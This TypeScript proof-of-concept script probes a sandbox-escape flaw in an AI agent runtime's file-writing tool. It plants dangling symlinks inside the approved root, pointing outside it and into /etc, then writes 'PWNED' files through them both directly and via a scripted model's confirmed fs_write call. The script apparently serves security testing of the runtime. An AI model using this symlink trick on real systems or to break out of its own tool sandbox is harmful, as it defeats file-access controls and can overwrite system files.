// fs_write: `resolveRealWithinRoot` realpaths the DEEPEST EXISTING ancestor. A symlink
// whose target does not exist yet is itself "non-existent" to realpath(), so the link is
// never followed during the check — but writeFile() follows it.
import { testRuntime } from "../../../../src/vesper/test-helpers.ts";
import { writeApproved, readApproved } from "../../../../src/vesper/tools/filesystem.ts";
import { readFile, symlink, rm, mkdir } from "node:fs/promises";
import type { CompletionRequest, ModelToolCall } from "../../../../src/vesper/types.ts";

const B = "/home/user/vesper-probes/filesystem-escape/sandbox";
const APPROVED = `${B}/approved`;
const TARGET_DIR = `${B}/outside`;

await rm(TARGET_DIR, { recursive: true, force: true });
await mkdir(TARGET_DIR, { recursive: true });
await rm(`${APPROVED}/dangling.txt`, { force: true });
await rm(`${APPROVED}/etc-dangling.txt`, { force: true });

// A dangling link inside the approved root, pointing at a file that does not exist yet.
await symlink(`${TARGET_DIR}/pwned.txt`, `${APPROVED}/dangling.txt`);
await symlink(`/etc/vesper-pwn-probe.txt`, `${APPROVED}/etc-dangling.txt`);

const ROOTS = [APPROVED];

console.log("--- direct writeApproved ---");
console.log("write <approved>/dangling.txt ->", JSON.stringify(await writeApproved(ROOTS, `${APPROVED}/dangling.txt`, "PWNED-OUTSIDE-APPROVED-ROOT")));
console.log("content of", `${TARGET_DIR}/pwned.txt`, "=", JSON.stringify(await readFile(`${TARGET_DIR}/pwned.txt`, "utf8").catch((e) => `ERR ${e.code}`)));

console.log("write <approved>/etc-dangling.txt ->", JSON.stringify(await writeApproved(ROOTS, `${APPROVED}/etc-dangling.txt`, "PWNED-IN-ETC")));
console.log("content of /etc/vesper-pwn-probe.txt =", JSON.stringify(await readFile(`/etc/vesper-pwn-probe.txt`, "utf8").catch((e) => `ERR ${e.code}`)));

// And the read side, for contrast: once the target exists the link IS followed and refused.
console.log("read back through the same link ->", JSON.stringify(await readApproved(ROOTS, `${APPROVED}/dangling.txt`)));

console.log("\n--- end-to-end through the runtime (fs_write, confirmed) ---");
await rm(`${TARGET_DIR}/pwned2.txt`, { force: true });
await rm(`${APPROVED}/d2.txt`, { force: true });
await symlink(`${TARGET_DIR}/pwned2.txt`, `${APPROVED}/d2.txt`);

function scripted(steps: { name: string; args: Record<string, unknown> }[]) {
  let n = 0;
  return {
    id: "atk", kind: "local" as const, isAvailable: () => true,
    async probe() { return { available: true, detail: "atk" }; },
    async complete(req: CompletionRequest, model: string) {
      const step = steps[n];
      n += 1;
      const toolCalls: ModelToolCall[] = step ? [{ id: `c${n}`, name: step.name, arguments: step.args as never }] : [];
      return { text: step ? "" : "done", toolCalls, providerId: "atk", model, role: req.role };
    },
  };
}

const runtime = await testRuntime({
  config: { approvedRoots: [APPROVED], knowledgeSources: [] },
  providers: [scripted([{ name: "fs_write", args: { path: `${APPROVED}/d2.txt`, content: "PWNED-VIA-RUNTIME" } }])],
});
let turn = await runtime.chat("save my note");
const pending = turn.pendingConfirmations[0];
console.log("pending:", pending?.toolName, JSON.stringify(pending?.args));
turn = await runtime.chat("yes", { confirmId: pending!.id, approve: true });
for (const c of turn.toolCalls) console.log("fs_write ->", "allowed=", c.decision.allowed, "ok=", c.result?.ok, c.result?.summary);
console.log("content of", `${TARGET_DIR}/pwned2.txt`, "=", JSON.stringify(await readFile(`${TARGET_DIR}/pwned2.txt`, "utf8").catch((e) => `ERR ${e.code}`)));
await runtime.stop();
